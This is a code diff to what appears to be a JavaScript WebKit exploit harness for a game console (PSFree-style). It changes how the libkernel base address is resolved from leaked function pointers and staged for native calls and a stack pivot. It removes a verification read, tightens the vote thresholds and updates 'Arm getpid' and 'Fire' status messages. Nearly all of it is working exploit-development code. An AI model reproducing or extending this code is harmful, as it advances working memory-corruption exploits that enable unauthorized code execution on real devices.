@@ -44,7 +44,6 @@ import {
     formatPsfreeStats,
     resolveLibkernelFindChunk,
     resolveLibkernelRelroChunk,
-    verifyLibkernelBase,
     verifyLibkernelZeroRead,
     calcLkFromFnPtrZeroRead,
     calcLkBestFromFnPtr,
@@ -61,7 +60,7 @@ import { createCrashLog } from "./log_persist.js";
 import { prepNativeChain, stageGetpid, stageUsleep, fireNativeCall, fireUsleep, firePivotSmoke } from "./native_call.js";
 
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250832p";
+const BUILD_ID = "rw-20250832q";
 const SS_NATIVE_MODE = "wk-native-mode";
 /** Auto-fire at PRIMITIVE-OK — #native-mode dropdown. Default off (fire kills tab if lk/pivot wrong). */
 function getNativeMode() {
@@ -504,15 +503,15 @@ let findLkPreset = null;
 const FIND_LK_LITE = {
     label: "lite",
     lite: true,
-    safeOnly: false,
-    collectOnly: false,
-    deferResolve: false,
+    safeOnly: true,
+    collectOnly: true,
+    deferResolve: true,
     maxWalkPages: 0,
     knownMax: 48,
     knownWalkPages: 0,
-    knownBatch: 2,
+    knownBatch: 1,
     vtableEntries: 24,
-    vtBatch: 2,
+    vtBatch: 1,
     minWalkPages: 128,
     walkPages: 48,
     cellMax: 3,
@@ -520,15 +519,15 @@ const FIND_LK_LITE = {
 const FIND_LK_NORM = {
     label: "norm",
     lite: false,
-    safeOnly: false,
-    collectOnly: false,
-    deferResolve: false,
+    safeOnly: true,
+    collectOnly: true,
+    deferResolve: true,
     maxWalkPages: 0,
     knownMax: 64,
     knownWalkPages: 0,
-    knownBatch: 2,
+    knownBatch: 1,
     vtableEntries: 48,
-    vtBatch: 3,
+    vtBatch: 2,
     minWalkPages: 160,
     walkPages: 64,
     cellMax: 4,
@@ -610,7 +609,9 @@ function logExtScanRank(tag, rank) {
     if (!rank || !rank.length) return;
     for (let i = 0; i < rank.length && i < 4; i++) {
         const r = rank[i];
-        mark(tag, (i + 1) + " " + String(r.lk) + " votes=" + r.count
+        mark(tag, (i + 1) + " " + String(r.lk)
+            + " fn=" + (r.distinctFn != null ? r.distinctFn : "?")
+            + " votes=" + r.count
             + " via=" + (r.vias ? r.vias.join(",") : "?"));
     }
 }
@@ -669,9 +670,8 @@ async function runScanExtToLk() {
         renderOut();
 
         const hit = resolveLibkernelFromExtList(p, webkitBase, off, merged, {
-            minVotes: 1,
-            verify: true,
-            walkPages: 48,
+            minVotes: 2,
+            minDistinctFn: 2,
         });
 
         if (hit.zeroRank && hit.zeroRank.length)
@@ -681,22 +681,22 @@ async function runScanExtToLk() {
             saveLibkernelSession(hit.lk, hit.iatRva || null);
             if (addrIn) addrIn.value = String(hit.lk);
             mark("LK-OK", hit.lk + " (" + hit.method + "/" + hit.via + ")"
-                + (hit.vote != null ? " vote=" + hit.vote : "")
-                + " tried=" + hit.tried);
-            mark("LK-HINT", "Accept lk → reload → Arm getpid");
-            state("libkernel auto OK", "ok");
-            crashLog.append("LK-EXT-SCAN " + hit.lk + " " + hit.method, "LK-OK");
+                + " reads=0 distinctFn=" + (hit.distinctFn != null ? hit.distinctFn : "?"));
+            mark("LK-HINT", "Accept lk → reload → pivot smoke → Arm getpid");
+            state("libkernel auto OK (0-read)", "ok");
+            crashLog.append("LK-EXT-SCAN " + hit.lk + " " + hit.method + " r0", "LK-OK");
             crashLog.flushSync();
             renderOut();
             return true;
         }
 
         mark("LK-EXT-MISS", hit.error || "no consensus lk");
-        if (hit.zeroRank && hit.zeroRank.length) {
-            mark("LK-HINT", "zero-vote had candidates but usleep verify failed — check 13.52 RVAs");
-        } else {
+        if (hit.hint)
+            mark("LK-HINT", hit.hint);
+        else if (hit.zeroRank && hit.zeroRank.length)
+            mark("LK-HINT", "need 2+ ext fn ptrs → same …c30 (no lk peek)");
+        else
             mark("LK-HINT", "ext ptrs may be libc/webkit — re-run cal 2e after groom");
-        }
         state("ext scan miss", "bad");
         renderOut();
         return false;
@@ -2392,15 +2392,7 @@ function finishFindLkChunk(chunk) {
         if (addrIn) addrIn.value = String(chunk.lk);
         mark("LK-GOT-OK", (chunk.source || chunk.phase) + " → " + chunk.lk
             + " build=" + BUILD_ID);
-        const p = window.p;
-        if (p) {
-            const v = verifyLibkernelBase(p, chunk.lk, loadEffectiveOff());
-            if (v.ok && v.strong)
-                mark("LK-VERIFY-OK", "stub+" + v.stubOff.toString(16));
-            else if (v.ok)
-                mark("LK-VERIFY-WARN", v.warn || "weak");
-        }
-        state("Scan GOT OK — Force lk → Arm → Fire", "ok");
+        state("Scan GOT OK — Accept lk → Arm → Fire", "ok");
         crashLog.append("LK-GOT-OK " + chunk.lk, "LK-GOT");
         crashLog.flushSync();
         return true;
@@ -2450,15 +2442,14 @@ function finishFindLkChunk(chunk) {
             const wb = basesFromSession(off).webkitBase;
             if (p && wb && merged.length) {
                 const hit = resolveLibkernelFromExtList(p, wb, off, merged, {
-                    minVotes: 1,
-                    verify: true,
-                    walkPages: 48,
+                    minVotes: 2,
+                    minDistinctFn: 2,
                 });
                 if (hit.ok && hit.lk) {
                     saveLibkernelSession(hit.lk, hit.iatRva || null);
                     if (addrIn) addrIn.value = String(hit.lk);
-                    mark("LK-OK", hit.lk + " (" + hit.method + "/" + hit.via + ")");
-                    state("Scan GOT → ext auto OK", "ok");
+                    mark("LK-OK", hit.lk + " (" + hit.method + "/" + hit.via + ") reads=0");
+                    state("Scan GOT → ext auto OK (0-read)", "ok");
                     renderOut();
                     crashLog.append("LK-GOT-EXT " + hit.lk, "LK-OK");
                     crashLog.flushSync();
